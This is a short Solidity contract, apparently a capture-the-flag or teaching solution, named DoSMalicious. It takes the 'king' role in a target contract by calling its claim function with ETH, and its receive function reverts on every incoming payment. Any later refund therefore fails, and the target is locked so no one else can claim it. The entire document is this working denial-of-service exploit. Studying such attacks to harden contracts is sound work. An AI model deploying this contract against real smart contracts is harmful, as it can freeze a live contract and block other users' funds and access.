// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IKing { function claim() external payable; }
contract DoSMalicious {
    IKing target;
    constructor(address _target) { target = IKing(_target); }
    function attack() external payable { target.claim{value: msg.value}(); }
    receive() external payable { revert("I refuse ETH"); }
}